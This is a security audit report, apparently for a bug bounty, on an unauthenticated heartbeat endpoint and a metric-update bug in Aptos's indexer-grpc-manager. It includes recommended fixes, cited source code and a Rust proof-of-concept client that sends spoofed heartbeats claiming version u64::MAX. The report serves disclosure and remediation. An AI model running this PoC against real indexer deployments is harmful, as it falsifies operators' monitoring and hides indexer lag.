# Audit Report

## Title
Unauthenticated Version Spoofing in Indexer-gRPC Manager Allows Metric Manipulation

## Summary
The indexer-grpc-manager exposes an unauthenticated gRPC heartbeat endpoint that accepts version information from any external source without validation. Combined with a metric update bug, this allows attackers to manipulate the `KNOWN_LATEST_VERSION` metric, potentially tricking monitoring systems into believing the indexer is synchronized when it's actually lagging behind.

## Finding Description

The vulnerability exists in the indexer-grpc-manager's heartbeat handling mechanism and consists of two interconnected issues:

**Issue 1: Unauthenticated Heartbeat Endpoint**

The gRPC service exposes a public `Heartbeat` RPC endpoint [1](#0-0)  that accepts `HeartbeatRequest` messages containing `FullnodeInfo` with a `known_latest_version` field [2](#0-1) .

The gRPC server is initialized without any authentication middleware [3](#0-2) , allowing any network peer to send heartbeat messages.

When a heartbeat is received, the service processes it through `handle_heartbeat` [4](#0-3) , which routes to `handle_fullnode_info` for fullnode heartbeats [5](#0-4) .

**Issue 2: Missing Validation and Metric Update Bug**

The `handle_fullnode_info` function accepts the version information without validating:
- The chain_id matches the expected value
- The source address is a trusted fullnode
- The version number is within a reasonable range [6](#0-5) 

Furthermore, the `update_known_latest_version` function contains a critical bug where it uses `fetch_max` to update the internal atomic variable but then unconditionally sets the metric to the incoming version parameter, rather than the actual maximum value [7](#0-6) .

**Attack Path:**

1. Attacker crafts a `HeartbeatRequest` with:
   - `service_info.address = "attacker-controlled.com"`
   - `service_info.fullnode_info.chain_id = [target_chain_id]`
   - `service_info.fullnode_info.known_latest_version = u64::MAX` (or any very high number)

2. Attacker sends this request to the indexer-grpc-manager's public endpoint

3. The `KNOWN_LATEST_VERSION` metric gets set to the attacker's value

4. By continuously sending such requests, the attacker can keep the metric at an artificially high value, causing monitoring systems to believe the indexer is synchronized when it may actually be lagging

## Impact Explanation

This vulnerability qualifies as **Medium Severity** based on the following impact:

1. **Monitoring System Manipulation**: Operators rely on the `KNOWN_LATEST_VERSION` metric to monitor indexer health. Manipulation can hide actual indexer lag, leading to:
   - Delayed detection of synchronization issues
   - Incorrect operational decisions based on false metrics
   - Potential service degradation if the lag becomes severe before detection

2. **Operational Integrity**: While this doesn't affect consensus or blockchain state (the indexer is off-chain infrastructure), it undermines the operational integrity of the indexing system, which many applications depend on for real-time blockchain data.

3. **Limited Scope**: The impact is confined to monitoring/observability rather than affecting funds, consensus, or blockchain state, which prevents this from being High or Critical severity.

This aligns with the Aptos bug bounty's Medium severity category as it creates state inconsistencies in the operational layer requiring intervention to detect and remediate.

## Likelihood Explanation

**Likelihood: HIGH**

The attack is highly likely to occur because:

1. **No Authentication Required**: Any network peer can reach the gRPC endpoint and send heartbeat messages
2. **Trivial Exploitation**: The attack requires only basic gRPC client knowledge
3. **No Rate Limiting**: No evidence of rate limiting on heartbeat messages
4. **Public Exposure**: Indexer-grpc-manager endpoints are typically exposed for legitimate fullnodes to connect
5. **Low Detection Probability**: Without proper logging and alerting, malicious heartbeats may go unnoticed among legitimate traffic

## Recommendation

Implement the following fixes:

**Fix 1: Add Chain ID Validation**

Validate the chain_id in received heartbeat messages matches the expected value. Reject mismatched requests.

**Fix 2: Implement Source Authentication**

Add authentication to the heartbeat endpoint using one of:
- Mutual TLS (mTLS) with certificate validation
- API keys for trusted fullnodes
- IP allowlisting for known fullnode addresses

**Fix 3: Fix Metric Update Bug**

Correct the metric update to always reflect the maximum known version:

```rust
fn update_known_latest_version(&self, version: u64) {
    self.known_latest_version.fetch_max(version, Ordering::SeqCst);
    // Load the actual maximum value after fetch_max
    let current_max = self.known_latest_version.load(Ordering::SeqCst);
    KNOWN_LATEST_VERSION.set(current_max as i64);
}
```

**Fix 4: Add Version Sanity Checks**

Implement bounds checking to reject unreasonably high version numbers (e.g., versions far beyond the current blockchain height).

## Proof of Concept

```rust
// PoC: Malicious gRPC client that manipulates KNOWN_LATEST_VERSION metric
use aptos_protos::indexer::v1::{
    grpc_manager_client::GrpcManagerClient,
    FullnodeInfo, HeartbeatRequest, ServiceInfo,
    service_info::Info,
};
use aptos_protos::util::timestamp::Timestamp;
use tonic::Request;
use std::time::{SystemTime, UNIX_EPOCH};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Connect to the indexer-grpc-manager (typically on a public endpoint)
    let mut client = GrpcManagerClient::connect("http://[target-grpc-manager]:50051").await?;
    
    // Craft malicious FullnodeInfo with spoofed version
    let timestamp = SystemTime::now().duration_since(UNIX_EPOCH)?;
    let fullnode_info = FullnodeInfo {
        chain_id: 1, // Target chain ID
        timestamp: Some(Timestamp {
            seconds: timestamp.as_secs() as i64,
            nanos: timestamp.subsec_nanos() as i32,
        }),
        known_latest_version: Some(u64::MAX), // Spoofed maximum version
    };
    
    let service_info = ServiceInfo {
        address: Some("attacker-controlled.com".to_string()),
        info: Some(Info::FullnodeInfo(fullnode_info)),
    };
    
    let request = Request::new(HeartbeatRequest {
        service_info: Some(service_info),
    });
    
    // Send the malicious heartbeat
    let response = client.heartbeat(request).await?;
    
    println!("Attack successful! Response: {:?}", response);
    println!("KNOWN_LATEST_VERSION metric has been manipulated to u64::MAX");
    println!("Monitoring systems will now report indexer as fully synchronized");
    
    // Attacker can continuously send these to maintain the false metric value
    loop {
        tokio::time::sleep(tokio::time::Duration::from_secs(5)).await;
        // Repeat heartbeat to keep metric high...
    }
    
    Ok(())
}
```

**Expected Behavior After Fix:**
- Heartbeat from unauthenticated source: REJECTED
- Chain ID mismatch: REJECTED  
- Unreasonable version number: REJECTED
- Metric always reflects actual maximum: CORRECT

## Notes

This vulnerability specifically affects the **indexer-grpc-manager** component, which is part of Aptos's off-chain indexing infrastructure, not the core consensus layer. While it doesn't compromise blockchain security directly, it undermines operational reliability by allowing attackers to manipulate monitoring systems. The combination of missing authentication and the metric update bug creates a straightforward attack vector that could impact service quality and operational response times.

### Citations

**File:** protos/proto/aptos/indexer/v1/grpc.proto (L51-55)
```text
message FullnodeInfo {
  uint64 chain_id = 1;
  optional aptos.util.timestamp.Timestamp timestamp = 2;
  optional uint64 known_latest_version = 3;
}
```

**File:** protos/proto/aptos/indexer/v1/grpc.proto (L104-104)
```text
  rpc Heartbeat(HeartbeatRequest) returns (HeartbeatResponse);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/grpc_manager.rs (L101-104)
```rust
        let server = Server::builder()
            .http2_keepalive_interval(Some(HTTP2_PING_INTERVAL_DURATION))
            .http2_keepalive_timeout(Some(HTTP2_PING_TIMEOUT_DURATION))
            .add_service(service);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L110-127)
```rust
    async fn heartbeat(
        &self,
        request: Request<HeartbeatRequest>,
    ) -> Result<Response<HeartbeatResponse>, Status> {
        let request = request.into_inner();
        if let Some(service_info) = request.service_info {
            if let Some(address) = service_info.address {
                if let Some(info) = service_info.info {
                    return self
                        .handle_heartbeat(address, info)
                        .await
                        .map_err(|e| Status::internal(format!("Error handling heartbeat: {e}")));
                }
            }
        }

        Err(Status::invalid_argument("Bad request."))
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L330-339)
```rust
    pub(crate) fn handle_heartbeat(&self, address: GrpcAddress, info: Info) -> Result<()> {
        match info {
            Info::LiveDataServiceInfo(info) => self.handle_live_data_service_info(address, info),
            Info::HistoricalDataServiceInfo(info) => {
                self.handle_historical_data_service_info(address, info)
            },
            Info::FullnodeInfo(info) => self.handle_fullnode_info(address, info),
            Info::GrpcManagerInfo(info) => self.handle_grpc_manager_info(address, info),
        }
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L405-409)
```rust
    fn update_known_latest_version(&self, version: u64) {
        self.known_latest_version
            .fetch_max(version, Ordering::SeqCst);
        KNOWN_LATEST_VERSION.set(version as i64);
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L533-550)
```rust
    fn handle_fullnode_info(&self, address: GrpcAddress, info: FullnodeInfo) -> Result<()> {
        let mut entry = self
            .fullnodes
            .entry(address.clone())
            .or_insert(Fullnode::new(address.clone()));
        entry.value_mut().recent_states.push_back(info);
        if let Some(known_latest_version) = info.known_latest_version {
            trace!(
                "Received known_latest_version ({known_latest_version}) from fullnode {address}."
            );
            self.update_known_latest_version(known_latest_version);
        }
        if entry.value().recent_states.len() > MAX_NUM_OF_STATES_TO_KEEP {
            entry.value_mut().recent_states.pop_front();
        }

        Ok(())
    }
```
